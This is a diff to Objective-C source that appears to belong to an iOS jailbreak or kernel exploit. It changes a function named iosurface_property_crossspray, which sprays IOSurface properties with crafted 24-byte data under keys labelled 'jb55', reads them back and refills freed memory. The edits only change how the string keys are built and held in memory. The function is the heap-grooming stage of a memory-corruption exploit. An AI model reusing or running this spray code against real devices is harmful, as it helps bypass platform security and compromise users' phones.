@@ -41620,10 +41620,10 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         }
 
         int w = 256, h = 256, bpe = 4;
-        void *wKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceWidth"];
-        void *hKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceHeight"];
-        void *bpeKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceBytesPerElement"];
-        void *allocKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceAllocSize"];
+        void *wKey = (__bridge void*)@"IOSurfaceWidth";
+        void *hKey = (__bridge void*)@"IOSurfaceHeight";
+        void *bpeKey = (__bridge void*)@"IOSurfaceBytesPerElement";
+        void *allocKey = (__bridge void*)@"IOSurfaceAllocSize";
         int allocSz = w * h * bpe;
         void *wVal = sym_numcreate(NULL, 9, &w);
         void *hVal = sym_numcreate(NULL, 9, &h);
@@ -41678,7 +41678,8 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 32 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_pre_%02d", i);
-                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
+                    NSString *cfKeyStr = [NSString stringWithUTF8String:keyBuf];
+                    void *cfKey = (__bridge void*)cfKeyStr;
                     void *cfVal = sym_datacreate(NULL, propData, 24);
                     sym_surf_setval(surface, cfKey, cfVal);
 
@@ -41693,7 +41694,8 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 64 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_post_%02d", i);
-                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
+                    NSString *cfKeyStr = [NSString stringWithUTF8String:keyBuf];
+                    void *cfKey = (__bridge void*)cfKeyStr;
                     void *cfVal = sym_datacreate(NULL, reclaimData, 24);
                     sym_surf_setval(surface, cfKey, cfVal);
 
@@ -41703,7 +41705,8 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 32 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_pre_%02d", i);
-                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
+                    NSString *cfKeyStr = [NSString stringWithUTF8String:keyBuf];
+                    void *cfKey = (__bridge void*)cfKeyStr;
                     void *readVal = sym_surf_copyval(surface, cfKey);
 
                     if (readVal) {
@@ -41753,7 +41756,8 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 64 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_rev_%02d", i);
-                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
+                    NSString *cfKeyStr = [NSString stringWithUTF8String:keyBuf];
+                    void *cfKey = (__bridge void*)cfKeyStr;
                     void *cfVal = sym_datacreate(NULL, fillData, 24);
                     sym_surf_setval(surface, cfKey, cfVal);
 
@@ -41763,7 +41767,8 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 64 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_rev_%02d", i);
-                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
+                    NSString *cfKeyStr = [NSString stringWithUTF8String:keyBuf];
+                    void *cfKey = (__bridge void*)cfKeyStr;
                     void *readVal = sym_surf_copyval(surface, cfKey);
 
                     if (readVal) {
